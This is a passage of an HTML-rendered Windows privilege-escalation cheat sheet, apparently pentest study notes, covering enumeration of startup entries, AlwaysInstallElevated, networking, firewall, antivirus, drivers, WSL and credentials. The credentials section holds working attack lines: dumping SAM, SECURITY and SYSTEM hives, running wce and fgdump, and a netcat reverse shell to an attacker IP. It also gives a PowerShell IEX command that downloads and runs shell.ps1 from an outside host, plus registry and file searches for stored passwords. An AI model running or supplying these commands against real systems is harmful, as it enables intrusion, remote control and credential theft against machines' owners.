</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskPath</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s2">"\Microsoft*"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="nx">TaskPath</span><span class="p">,</span><span class="nx">State</span><span class="w">
</span></code></pre></div></div> <h2 id="what-is-ran-at-startup"> <a href="#what-is-ran-at-startup" class="anchor-heading" aria-labelledby="what-is-ran-at-startup"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> What is ran at startup? </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span><span class="w"> </span><span class="nx">startup</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">caption</span><span class="p">,</span><span class="nx">command</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="s2">"C:\Documents and Settings\%username%\Start Menu\Programs\Startup"</span><span class="w">

</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nx">Win32_StartupCommand</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">command</span><span class="p">,</span><span class="w"> </span><span class="nx">Location</span><span class="p">,</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span><span class="nx">Get-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'</span><span class="w">
</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'</span><span class="w">
</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'</span><span class="w">
</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Users\All Users\Start Menu\Programs\Startup"</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">\Start Menu\Programs\Startup"</span><span class="w">

</span><span class="c"># If write access if provided to StartUp folder, use a vbs script to create a malicious shortcut and execute a custom binary</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-alwaysinstallelevated-and-binaries-that-autoelevate"> <a href="#enumerate-alwaysinstallelevated-and-binaries-that-autoelevate" class="anchor-heading" aria-labelledby="enumerate-alwaysinstallelevated-and-binaries-that-autoelevate"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate AlwaysInstallElevated and binaries that AutoElevate </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Is AlwaysInstallElevated enabled? I have not ran across this but it doesn’t hurt to check.</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">AlwaysInstallElevated</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
	</span><span class="n">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
	</span><span class="nx">AlwaysInstallElevated</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">0x1</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
	</span><span class="n">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
	</span><span class="nx">AlwaysInstallElevated</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">0x1</span><span class="w">

</span><span class="c"># If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.</span><span class="w">
</span><span class="c"># msfvenom &lt;payload&gt; &lt;lhost&gt; &lt;lport&gt; -f msi -o exploit.msi</span><span class="w">
</span><span class="n">msiexec</span><span class="w"> </span><span class="nx">/quit</span><span class="w"> </span><span class="nx">/qn</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">exploit.msi</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-networking-information"> <a href="#enumerate-networking-information" class="anchor-heading" aria-labelledby="enumerate-networking-information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Networking Information </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">                      	</span><span class="c"># Show all interfaces</span><span class="w">

</span><span class="c"># What routes do we have?</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">                        	</span><span class="c"># Show all routing tables</span><span class="w">

</span><span class="c"># Are there connections to other hosts?</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">                    	</span><span class="c"># Show every active network connections</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-abno</span><span class="w">    					</span><span class="c"># Show every active network connections and the exe file      </span><span class="w">

</span><span class="c"># What in the ARP cache?</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w">

</span><span class="c"># Anything in the hosts file?</span><span class="w">
</span><span class="n">C:\WINDOWS\System32\drivers\etc\hosts</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-firewall-status-and-rules"> <a href="#enumerate-firewall-status-and-rules" class="anchor-heading" aria-labelledby="enumerate-firewall-status-and-rules"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Firewall Status and Rules </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">currentprofile</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">all</span><span class="w">

</span><span class="n">netsh</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">state</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">config</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">all</span><span class="w">
</span><span class="nx">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">export</span><span class="w"> </span><span class="s2">"firewall.txt"</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-antivirus"> <a href="#enumerate-antivirus" class="anchor-heading" aria-labelledby="enumerate-antivirus"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Antivirus </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">windefend</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">brief</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"c:\windows"</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">queryex</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="w"> </span><span class="n">service</span><span class="w">
</span></code></pre></div></div> <h2 id="enumerate-device-drivers-and-kernel-modules"> <a href="#enumerate-device-drivers-and-kernel-modules" class="anchor-heading" aria-labelledby="enumerate-device-drivers-and-kernel-modules"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumerate Device Drivers and Kernel Modules </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\student</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">driverquery.exe</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">csv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-CSV</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="err">‘</span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="err">‘</span><span class="nx">Start</span><span class="w"> </span><span class="nx">Mode</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="nx">Path</span><span class="w">  </span><span class="c"># List of drivers</span><span class="w">
</span><span class="n">Display</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="nx">Start</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="nx">Path</span><span class="w">
</span><span class="o">------------</span><span class="w"> </span><span class="o">----------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="mi">1394</span><span class="w"> </span><span class="n">OHCI</span><span class="w"> </span><span class="nx">Compliant</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">Manual</span><span class="w"> </span><span class="nx">C:\Windows\system32\drivers\1394ohci.s</span><span class="w">
</span><span class="mi">3</span><span class="n">ware</span><span class="w"> </span><span class="nx">Manual</span><span class="w"> </span><span class="nx">C:\Windows\system32\drivers\3ware.sys</span><span class="w">
</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Boot</span><span class="w"> </span><span class="nx">C:\Windows\system32\drivers\ACPI.sys</span><span class="w">
</span><span class="n">ACPI</span><span class="w"> </span><span class="nx">Devices</span><span class="w"> </span><span class="nx">driver</span><span class="w"> </span><span class="nx">Manual</span><span class="w"> </span><span class="nx">C:\Windows\system32\drivers\AcpiDev.sy</span><span class="w">
</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">ACPIEx</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Boot</span><span class="w"> </span><span class="nx">C:\Windows\system32\Drivers\acpiex.sys</span><span class="w">
</span><span class="o">...</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\student</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_PnPSignedDriver</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DeviceName</span><span class="p">,</span><span class="w"> </span><span class="nx">DriverVersion</span><span class="p">,</span><span class="w"> </span><span class="nx">Manufacturer</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">DeviceName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*VMware*"</span><span class="p">}</span><span class="w">  </span><span class="c"># Version number</span><span class="w">
</span><span class="n">DeviceName</span><span class="w"> </span><span class="nx">DriverVersion</span><span class="w"> </span><span class="nx">Manufacturer</span><span class="w">
</span><span class="o">----------</span><span class="w"> </span><span class="o">-------------</span><span class="w"> </span><span class="o">------------</span><span class="w">
</span><span class="n">VMware</span><span class="w"> </span><span class="nx">VMCI</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="nx">Device</span><span class="w"> </span><span class="nx">9.8.6.0</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">VMware</span><span class="w"> </span><span class="nx">PVSCSI</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">1.3.10.0</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">VMware</span><span class="w"> </span><span class="nx">SVGA</span><span class="w"> </span><span class="nx">3D</span><span class="w"> </span><span class="nx">8.16.1.24</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">VMware</span><span class="w"> </span><span class="nx">VMCI</span><span class="w"> </span><span class="nx">Bus</span><span class="w"> </span><span class="nx">Device</span><span class="w"> </span><span class="nx">9.8.6.0</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span><span class="n">VMware</span><span class="w"> </span><span class="nx">Pointing</span><span class="w"> </span><span class="nx">Device</span><span class="w"> </span><span class="nx">12.5.7.0</span><span class="w"> </span><span class="nx">VMware</span><span class="p">,</span><span class="w"> </span><span class="nx">Inc.</span><span class="w">
</span></code></pre></div></div> <h2 id="windows-subsystem-for-linux-wsl"> <a href="#windows-subsystem-for-linux-wsl" class="anchor-heading" aria-labelledby="windows-subsystem-for-linux-wsl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows Subsystem for Linux (WSL) </h2> <blockquote> <p><strong>With root privileges</strong> Windows Subsystem for Linux (WSL) allows users to <strong>create a bind shell on any port</strong> (no elevation needed). Don’t know the root password? No problem just set the default user to root W/ .exe –default-user root. Now start your bind shell or reverse.</p> </blockquote> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where wsl.exe
where bash.exe

wsl <span class="nb">whoami</span>
./ubuntun1604.exe config <span class="nt">--default-user</span> root
wsl <span class="nb">whoami
</span>wsl python <span class="nt">-c</span> <span class="s1">'BIND_OR_REVERSE_SHELL_PYTHON_CODE'</span>
</code></pre></div></div> <p>Binary <code class="language-plaintext highlighter-rouge">bash.exe</code> can also be found in <code class="language-plaintext highlighter-rouge">C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe</code></p> <p>Alternatively you can explore the WSL filesystem in the folder <code class="language-plaintext highlighter-rouge">C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\</code></p> <h2 id="credentials"> <a href="#credentials" class="anchor-heading" aria-labelledby="credentials"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Credentials </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wce32.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w">
</span><span class="n">wce64.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w">
</span><span class="n">fgdump.exe</span><span class="w">

</span><span class="c"># Can we access SAM and SYSTEM files?</span><span class="w">
</span><span class="c">## Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">

</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\sam</span><span class="w"> </span><span class="nx">c:\sam_backup</span><span class="w">
</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\security</span><span class="w"> </span><span class="nx">c:\security_backup</span><span class="w">
</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">c:\system</span><span class="w">

</span><span class="c"># Anything interesting in Credential Manager?</span><span class="w">
</span><span class="n">cmdkey</span><span class="w"> </span><span class="nx">/list</span><span class="w">
</span><span class="c">## If credentials pops out they can be reused through RunAs ...</span><span class="w">
</span><span class="n">runas</span><span class="w"> </span><span class="nx">/savecred</span><span class="w"> </span><span class="nx">/user:WORKGROUP\\Administrator</span><span class="w"> </span><span class="s2">"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe"</span><span class="w">
</span><span class="n">runas.exe</span><span class="w"> </span><span class="nx">/env</span><span class="w"> </span><span class="nx">/noprofile</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"</span><span class="w">
</span><span class="c">## ... net use ...</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">\\localhost\c</span><span class="err">$</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">3130438f31186fbaf962f407711faddb</span><span class="w">
</span><span class="n">x:</span><span class="w">
</span><span class="c">## ... or powershell non interactive RunAs ...</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"BART\Administrator"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"3130438f31186fbaf962f407711faddb"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$secstr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Security.SecureString</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$password</span><span class="o">.</span><span class="nf">ToCharArray</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="nv">$secstr</span><span class="o">.</span><span class="nf">AppendChar</span><span class="p">(</span><span class="bp">$_</span><span class="p">)}</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nt">-typename</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nt">-argumentlist</span><span class="w"> </span><span class="nv">$username</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstr</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\inetpub\wwwroot\internal-01\log</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'http://10.10.15.48:8083/shell.ps1'</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="n">localhost</span><span class="w">


</span><span class="n">dir</span><span class="w"> </span><span class="nx">C:\Users\username\AppData\Local\Microsoft\Credentials\</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><span class="w">


</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Hidden</span><span class="w"> </span><span class="nx">C:\Users\username\AppData\Local\Microsoft\Credentials\</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Hidden</span><span class="w"> </span><span class="nx">C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><span class="w">

</span><span class="c"># Any passwords in the registry?</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKEY_CURRENT_USER\Software\TightVNC\Server"</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">

</span><span class="c"># Files containing password</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">inidir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">pass</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="o">*</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">C:\</span><span class="o">*</span><span class="w"> </span><span class="nt">-include</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="p">,</span><span class="o">*.</span><span class="nf">ini</span><span class="p">,</span><span class="o">*.</span><span class="nf">txt</span><span class="p">,</span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s2">"password"</span><span class="w">

</span><span class="c"># Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">pass</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="err">&gt;</span><span class="n">nul</span><span class="w">
</span><span class="nx">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">password</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">vnc</span><span class="o">*</span><span class="p">,</span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="nx">password</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">vnc</span><span class="o">*</span><span class="p">,</span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="o">*.</span><span class="nf">txt</span><span class="o">*</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">

